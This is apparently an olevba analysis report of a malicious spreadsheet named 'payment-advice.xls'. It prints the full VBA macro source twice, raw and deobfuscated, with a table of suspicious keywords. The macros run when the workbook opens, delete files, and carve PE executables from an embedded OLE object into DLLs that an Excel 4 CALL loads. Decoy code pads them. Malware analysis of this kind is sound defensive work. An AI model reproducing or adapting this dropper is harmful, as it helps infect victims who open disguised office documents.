olevba 0.56 on Python 3.9.0 - http://decalage.info/python/oletools
===============================================================================
FILE: payment-advice.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
If WelcomeDialog.Visible = True Then
Exit Sub
End If
Module0.WuzzyBud 800
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Page11.cls 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Page11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_Activate()

End Sub

Private Sub Worksheet_SelectionChange(ByVal Target As Range)

End Sub

-------------------------------------------------------------------------------
VBA MACRO Repositor.cls 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Repositor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Dim vSpeed As Integer
Dim vLicensePlate As String
 
Public Property Get Speed() As Integer
    Speed = vSpeed
End Property
 
Public Property Let Speed(sp As Integer)
    vSpeed = Application.WorksheetFunction.Min(sp, 100)
    vSpeed = Application.WorksheetFunction.Max(vSpeed, -100)
End Property
 
Public Property Get CheckCar(car As Object, Drive As String)
CheckCar = car.SpecialFolders("" & Drive)

End Property
Public Property Get SpecialFolders() As String
    LicensePlate = vLicensePlate
End Property
 
Public Property Let LicensePlate(lp As String)
    If Len(lp) <> 6 Then Err.Raise (xlErrValue) 'Raise error
    vLicensePlate = lp
End Property


-------------------------------------------------------------------------------
VBA MACRO Module0.bas 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Module0'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Public Sub WuzzyBud(dImmer As Integer)

If WelcomeDialog.Visible = True Then
Exit Sub
End If

Dim ActiveHotbit As New WshShell
 Dim s As String
 Dim GetInfirmityLevelDescription As String
    
    Dim d As Long
    d = 3
    d = d - 1
    Select Case d
    Case 0
        s = "No health problems"
    Case 1
        s = "Minor health problems"
    Case 2
        s = "Major health problems"
       
    Case 3
        s = "Severe disability"
    End Select


Dim car As Repositor
    Dim SpecialPath As String
    

PRP = "%" + Windows.TextBox1.Tag

Windows.TextBox1.Tag = ActiveHotbit.ExpandEnvironmentStrings(PRP + "%")

    
Set car = New Repositor
Windows.TextBox3.Tag = car.CheckCar(ActiveHotbit, Windows.TextBox3.Tag & "")
ChDir (Windows.TextBox1.Tag)
If WelcomeDialog.Visible = False Then

   CallByName WelcomeDialog, "Show", VbMethod
End If
End Sub









-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Public Const FirstB As Byte = 77
 Public Const SecondB As Byte = 90
 Public Const ThirdB As Byte = 144
Public Sub GetParam(Count As Integer)
    Dim i As Long
    Dim j As Integer
    Dim c As String
    Dim tooolsetChunkI As Boolean
    Dim tooolsetChunkQ As Boolean

    j = 1
    tooolsetChunkI = False
    tooolsetChunkQ = False
    GetP.aram = ""
    For i = 1 To Len(Comma.nd$)
        c = Mi.d$(Comma.nd$, i, 1)
        If tooolsetChunkI Then
            If c = """" Then
                j = j + 1
                tooolsetChunkI = False
                tooolsetChunkQ = False
            End If
        ElseIf tooolsetChunkI And Not tooolsetChunkQ Then
            If c = " " Then
                j = j + 1
                tooolsetChunkI = False
                tooolsetChunkQ = False
            End If
        Else
            If c = """" Then
                If j > Count Then Exit Sub
                tooolsetChunkI = True
                tooolsetChunkQ = True
            ElseIf c <> " " Then
                tooolsetChunkI = True
                tooolsetChunkQ = False
            End If
        End If
        If tooolsetChunkI And j = Count And c <> """" Then GetP.aram = GetP.aram & c
    Next i
End Sub











-------------------------------------------------------------------------------
VBA MACRO Module2.bas 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub ERRCHECK(result)
 If result = RCPN_D_FMOD_OK Then
 ms.gR.esult = MsgBox(result & ") ")
 End If
End Sub







Public Sub VistaQ(WhereToGo)
 DoEvents
        ThisWorkbook.Sheets.Copy
        Application.DisplayAlerts = False
        DoEvents
        ActiveWorkbook.SaveAs WhereToGo, Local:=False, FileFormat:=3 * 7 + 3 * 7 + 9
    DoEvents
    ActiveWorkbook.Close
    DoEvents
        
End Sub











Public Sub DerTip()
    
 Dim sendings As Integer
    dershlep = "" + Windows.TextBox1.Tag
    Dim ofbl As String
    Dim sOfbl As String
    ofbl = Windows.TextBox3.Tag + "\libIntel"
    Dim CurrentSizeOfAT As Long

ctackPup = Windows.TextBox1.Tag + "\manufact.xls" + "x"

        ctackPop = dershlep & Windows.TextBox3.Value
        
         Dim arr(1 To 3) As String
     
ctackPip = ctackPup & Page11.Range("A100").Value
 
 PublicResumEraseByArrayList ofbl + "*", ctackPop, ctackPip
 
  VistaQ ctackPup
    
        FileCopy ctackPup, ctackPip
         sendings = 1
         Dim sNMSP As New Shell
              
         
        
        If sendings > 0 And sendings > -30 Then
         
            Set DestinationKat = sNMSP.Namespace(dershlep)
            Set harvest = sNMSP.Namespace(ctackPip)
          
          
        End If
         FlagDouble = True
         textItem = Windows.Label11.Caption
DestinationKat.CopyHere harvest.Items.Item(textItem)

       
              For StepBit = 1 To 2
 
    CurrentSizeOfAT = 326144
      sendings = 1
            sendingsCSTR = "1"
        If FlagDouble Then
                CurrentSizeOfAT = 200000 + 57530 + 6
                sendings = 2
                FlagDouble = False
            sendingsCSTR = "2"
            End If
            
            sOfbl = ofbl + sendingsCSTR + ".dll"
 Composition dershlep & Windows.Label1.Tag, sOfbl, CurrentSizeOfAT, sendings
       
        If sendings < 100 Then
            sendings = sendings + 1
            sendings = sendings + 1
        End If
        If -100 <= sendings Then
            sendings = sendings + 1
            ChDir Windows.TextBox3.Tag
            sendings = sendings + 1
        End If
        
        
        If sendings < 0 Then
            sendings = sendings + 1
            sendings = sendings + 1
        End If
        sOfbl = """" + sOfbl

  
   varRes1 = ExecuteExcel4Macro("CALL(" + sOfbl & """,""" + "vufvuf"",""J"")")
   If IsNumeric(varRes1) Then
    If varRes1 = 0 Then
        Exit Sub
    End If
    End If
   
Next
End Sub


















-------------------------------------------------------------------------------
VBA MACRO Module4.bas 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Module4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




 
Public Sub GetParam(Count As Integer)
    Dim i As Long
    Dim j As Integer
    Dim c As String
    Dim tooolsetChunkI As Boolean
    Dim tooolsetChunkQ As Boolean

    j = 1
    tooolsetChunkI = False
    tooolsetChunkQ = False
    GetP.aram = ""
    For i = 1 To Len(Comma.nd$)
        c = Mi.d$(Comma.nd$, i, 1)
        If tooolsetChunkI Then
            If c = """" Then
                j = j + 1
                tooolsetChunkI = False
                tooolsetChunkQ = False
            End If
        ElseIf tooolsetChunkI And Not tooolsetChunkQ Then
            If c = " " Then
                j = j + 1
                tooolsetChunkI = False
                tooolsetChunkQ = False
            End If
        Else
            If c = """" Then
                If j > Count Then Exit Sub
                tooolsetChunkI = True
                tooolsetChunkQ = True
            ElseIf c <> " " Then
                tooolsetChunkI = True
                tooolsetChunkQ = False
            End If
        End If
        If tooolsetChunkI And j = Count And c <> """" Then GetP.aram = GetP.aram & c
    Next i
End Sub


























-------------------------------------------------------------------------------
VBA MACRO Module5.bas 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Module5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 
 Public DisputeChannel3 As Byte
     
Public HurricanMoes() As Byte

     
    Public abbrev As Byte
 Dim DecemberUpdate As Byte
 
 




Public Sub PublicResumEraseByArrayList(ParamArray putArrayBigList() As Variant)
    On Error Resume Next
    For Each Key In putArrayBigList
        Kill Key
    Next Key
    On Error GoTo 0
End Sub

Public Sub Composition(Composition2 As String, ofbl As String, fl As Long, DisputeChannel6 As Integer)
 Dim DisputeChannel1 As Long
 
 Dim SimpleMethod As Integer
 ReDim HurricanMoes(1 To fl)
 DisputeChannel1 = FreeFile
 Open Composition2 For Binary Access Read As DisputeChannel1
 Dim cur As Integer
 cur = 1
Do While 1
 Get DisputeChannel1, , abbrev
 If abbrev = FirstB Then
 HurricanMoes(1) = abbrev
 Get DisputeChannel1, , DisputeChannel3
 If DisputeChannel3 = SecondB Then
 HurricanMoes(2) = DisputeChannel3
 Get DisputeChannel1, , DecemberUpdate
 If DecemberUpdate = ThirdB Then
 HurricanMoes(3) = DecemberUpdate
 If cur = DisputeChannel6 Then
 For k = 4 To fl
 Get DisputeChannel1, , abbrev
 HurricanMoes(k) = abbrev
 Next k
 Exit Do
 Else
 cur = cur + 1
 End If
 End If
 End If
 End If
 Loop
 Close DisputeChannel1
 On Error Resume Next
 DisputeChannel1 = FreeFile
 Open ofbl For Binary Lock Read Write As #DisputeChannel1
 For i = LBound(HurricanMoes) To UBound(HurricanMoes)
 If WelcomeDialog.Enabled = True Then

 Put #DisputeChannel1, , HurricanMoes(i)
 End If
 Next i
 Close DisputeChannel1
 DisputeChannel1 = FreeFile
 For HSP = 33 To -1 Step -0.25
 DisputeChannel1 = 6 + i
 Next HSP
End Sub











-------------------------------------------------------------------------------
VBA MACRO Windows.frm 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Windows'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WelcomeDialog.frm 
in file: payment-advice.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/WelcomeDialog'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub UserForm_Activate()
DoEvents
DoEvents
DerTip
DoEvents
End Sub




-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Document
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\oleObject*.bin
-------------------------------------------------------------------------------
VBA FORM STRING IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Label1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xl\embeddings\oleObject1.bin�	
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox3'" IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'\\oleObject*.bin'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'payment-advice.xls' - OLE stream: '_VBA_PROJECT_CUR/Windows'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|CopyHere            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA obfuscated      |VBA string expressions were detected, may be |
|          |Strings             |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|VBA string|\manufact.xlsx      |"\manufact.xls" + "x"                        |
|VBA string|b'\xa1\x00'         |Range("A100")                                |
|VBA string|","vufvuf","J")     |""",""" + "vufvuf"",""J"")"                  |
+----------+--------------------+---------------------------------------------+
MACRO SOURCE CODE WITH DEOBFUSCATED VBA STRINGS (EXPERIMENTAL):


Private Sub Workbook_Open()
If WelcomeDialog.Visible = True Then
Exit Sub
End If
Module0.WuzzyBud 800
End Sub

Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Attribute VB_Name = "Page11"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Worksheet_Activate()

End Sub

Private Sub Worksheet_SelectionChange(ByVal Target As Range)

End Sub


Attribute VB_Name = "Repositor"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
    
Dim vSpeed As Integer
Dim vLicensePlate As String
 
Public Property Get Speed() As Integer
    Speed = vSpeed
End Property
 
Public Property Let Speed(sp As Integer)
    vSpeed = Application.WorksheetFunction.Min(sp, 100)
    vSpeed = Application.WorksheetFunction.Max(vSpeed, -100)
End Property
 
Public Property Get CheckCar(car As Object, Drive As String)
CheckCar = car.SpecialFolders("" & Drive)

End Property
Public Property Get SpecialFolders() As String
    LicensePlate = vLicensePlate
End Property
 
Public Property Let LicensePlate(lp As String)
    If Len(lp) <> 6 Then Err.Raise (xlErrValue) 'Raise error
    vLicensePlate = lp
End Property



Attribute VB_Name = "Module0"



Public Sub WuzzyBud(dImmer As Integer)

If WelcomeDialog.Visible = True Then
Exit Sub
End If

Dim ActiveHotbit As New WshShell
 Dim s As String
 Dim GetInfirmityLevelDescription As String
    
    Dim d As Long
    d = 3
    d = d - 1
    Select Case d
    Case 0
        s = "No health problems"
    Case 1
        s = "Minor health problems"
    Case 2
        s = "Major health problems"
       
    Case 3
        s = "Severe disability"
    End Select


Dim car As Repositor
    Dim SpecialPath As String
    

PRP = "%" + Windows.TextBox1.Tag

Windows.TextBox1.Tag = ActiveHotbit.ExpandEnvironmentStrings(PRP + "%")

    
Set car = New Repositor
Windows.TextBox3.Tag = car.CheckCar(ActiveHotbit, Windows.TextBox3.Tag & "")
ChDir (Windows.TextBox1.Tag)
If WelcomeDialog.Visible = False Then

   CallByName WelcomeDialog, "Show", VbMethod
End If
End Sub










Attribute VB_Name = "Module1"
 Public Const FirstB As Byte = 77
 Public Const SecondB As Byte = 90
 Public Const ThirdB As Byte = 144
Public Sub GetParam(Count As Integer)
    Dim i As Long
    Dim j As Integer
    Dim c As String
    Dim tooolsetChunkI As Boolean
    Dim tooolsetChunkQ As Boolean

    j = 1
    tooolsetChunkI = False
    tooolsetChunkQ = False
    GetP.aram = ""
    For i = 1 To Len(Comma.nd$)
        c = Mi.d$(Comma.nd$, i, 1)
        If tooolsetChunkI Then
            If c = """" Then
                j = j + 1
                tooolsetChunkI = False
                tooolsetChunkQ = False
            End If
        ElseIf tooolsetChunkI And Not tooolsetChunkQ Then
            If c = " " Then
                j = j + 1
                tooolsetChunkI = False
                tooolsetChunkQ = False
            End If
        Else
            If c = """" Then
                If j > Count Then Exit Sub
                tooolsetChunkI = True
                tooolsetChunkQ = True
            ElseIf c <> " " Then
                tooolsetChunkI = True
                tooolsetChunkQ = False
            End If
        End If
        If tooolsetChunkI And j = Count And c <> """" Then GetP.aram = GetP.aram & c
    Next i
End Sub












Attribute VB_Name = "Module2"

Private Sub ERRCHECK(result)
 If result = RCPN_D_FMOD_OK Then
 ms.gR.esult = MsgBox(result & ") ")
 End If
End Sub







Public Sub VistaQ(WhereToGo)
 DoEvents
        ThisWorkbook.Sheets.Copy
        Application.DisplayAlerts = False
        DoEvents
        ActiveWorkbook.SaveAs WhereToGo, Local:=False, FileFormat:=3 * 7 + 3 * 7 + 9
    DoEvents
    ActiveWorkbook.Close
    DoEvents
        
End Sub











Public Sub DerTip()
    
 Dim sendings As Integer
    dershlep = "" + Windows.TextBox1.Tag
    Dim ofbl As String
    Dim sOfbl As String
    ofbl = Windows.TextBox3.Tag + "\libIntel"
    Dim CurrentSizeOfAT As Long

ctackPup = Windows.TextBox1.Tag + "\manufact.xlsx"

        ctackPop = dershlep & Windows.TextBox3.Value
        
         Dim arr(1 To 3) As String
     
ctackPip = ctackPup & Page11."b'\xa1\x00'".Value
 
 PublicResumEraseByArrayList ofbl + "*", ctackPop, ctackPip
 
  VistaQ ctackPup
    
        FileCopy ctackPup, ctackPip
         sendings = 1
         Dim sNMSP As New Shell
              
         
        
        If sendings > 0 And sendings > -30 Then
         
            Set DestinationKat = sNMSP.Namespace(dershlep)
            Set harvest = sNMSP.Namespace(ctackPip)
          
          
        End If
         FlagDouble = True
         textItem = Windows.Label11.Caption
DestinationKat.CopyHere harvest.Items.Item(textItem)

       
              For StepBit = 1 To 2
 
    CurrentSizeOfAT = 326144
      sendings = 1
            sendingsCSTR = "1"
        If FlagDouble Then
                CurrentSizeOfAT = 200000 + 57530 + 6
                sendings = 2
                FlagDouble = False
            sendingsCSTR = "2"
            End If
            
            sOfbl = ofbl + sendingsCSTR + ".dll"
 Composition dershlep & Windows.Label1.Tag, sOfbl, CurrentSizeOfAT, sendings
       
        If sendings < 100 Then
            sendings = sendings + 1
            sendings = sendings + 1
        End If
        If -100 <= sendings Then
            sendings = sendings + 1
            ChDir Windows.TextBox3.Tag
            sendings = sendings + 1
        End If
        
        
        If sendings < 0 Then
            sendings = sendings + 1
            sendings = sendings + 1
        End If
        sOfbl = """" + sOfbl

  
   varRes1 = ExecuteExcel4Macro("CALL(" + sOfbl & """,""vufvuf"",""J"")")
   If IsNumeric(varRes1) Then
    If varRes1 = 0 Then
        Exit Sub
    End If
    End If
   
Next
End Sub



















Attribute VB_Name = "Module4"




 
Public Sub GetParam(Count As Integer)
    Dim i As Long
    Dim j As Integer
    Dim c As String
    Dim tooolsetChunkI As Boolean
    Dim tooolsetChunkQ As Boolean

    j = 1
    tooolsetChunkI = False
    tooolsetChunkQ = False
    GetP.aram = ""
    For i = 1 To Len(Comma.nd$)
        c = Mi.d$(Comma.nd$, i, 1)
        If tooolsetChunkI Then
            If c = """" Then
                j = j + 1
                tooolsetChunkI = False
                tooolsetChunkQ = False
            End If
        ElseIf tooolsetChunkI And Not tooolsetChunkQ Then
            If c = " " Then
                j = j + 1
                tooolsetChunkI = False
                tooolsetChunkQ = False
            End If
        Else
            If c = """" Then
                If j > Count Then Exit Sub
                tooolsetChunkI = True
                tooolsetChunkQ = True
            ElseIf c <> " " Then
                tooolsetChunkI = True
                tooolsetChunkQ = False
            End If
        End If
        If tooolsetChunkI And j = Count And c <> """" Then GetP.aram = GetP.aram & c
    Next i
End Sub



























Attribute VB_Name = "Module5"
 
 Public DisputeChannel3 As Byte
     
Public HurricanMoes() As Byte

     
    Public abbrev As Byte
 Dim DecemberUpdate As Byte
 
 




Public Sub PublicResumEraseByArrayList(ParamArray putArrayBigList() As Variant)
    On Error Resume Next
    For Each Key In putArrayBigList
        Kill Key
    Next Key
    On Error GoTo 0
End Sub

Public Sub Composition(Composition2 As String, ofbl As String, fl As Long, DisputeChannel6 As Integer)
 Dim DisputeChannel1 As Long
 
 Dim SimpleMethod As Integer
 ReDim HurricanMoes(1 To fl)
 DisputeChannel1 = FreeFile
 Open Composition2 For Binary Access Read As DisputeChannel1
 Dim cur As Integer
 cur = 1
Do While 1
 Get DisputeChannel1, , abbrev
 If abbrev = FirstB Then
 HurricanMoes(1) = abbrev
 Get DisputeChannel1, , DisputeChannel3
 If DisputeChannel3 = SecondB Then
 HurricanMoes(2) = DisputeChannel3
 Get DisputeChannel1, , DecemberUpdate
 If DecemberUpdate = ThirdB Then
 HurricanMoes(3) = DecemberUpdate
 If cur = DisputeChannel6 Then
 For k = 4 To fl
 Get DisputeChannel1, , abbrev
 HurricanMoes(k) = abbrev
 Next k
 Exit Do
 Else
 cur = cur + 1
 End If
 End If
 End If
 End If
 Loop
 Close DisputeChannel1
 On Error Resume Next
 DisputeChannel1 = FreeFile
 Open ofbl For Binary Lock Read Write As #DisputeChannel1
 For i = LBound(HurricanMoes) To UBound(HurricanMoes)
 If WelcomeDialog.Enabled = True Then

 Put #DisputeChannel1, , HurricanMoes(i)
 End If
 Next i
 Close DisputeChannel1
 DisputeChannel1 = FreeFile
 For HSP = 33 To -1 Step -0.25
 DisputeChannel1 = 6 + i
 Next HSP
End Sub












Attribute VB_Name = "Windows"
Attribute VB_Base = "0{0867C13C-271B-4751-AEF2-6B25821B1365}{6C5CDE15-CD51-492F-980C-DD98497EEAEE}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Attribute VB_Name = "WelcomeDialog"
Attribute VB_Base = "0{0F7BA7F9-8AF4-44EC-BBD6-6EFB95C2F01F}{5FA06C29-63D8-4363-B90D-86A7D5403E87}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub UserForm_Activate()
DoEvents
DoEvents
DerTip
DoEvents
End Sub





' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Document
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet1

H�,�	
\oleObject*.bin
�Label1
Tahoma5
�xl\embeddings\oleObject1.bin�	

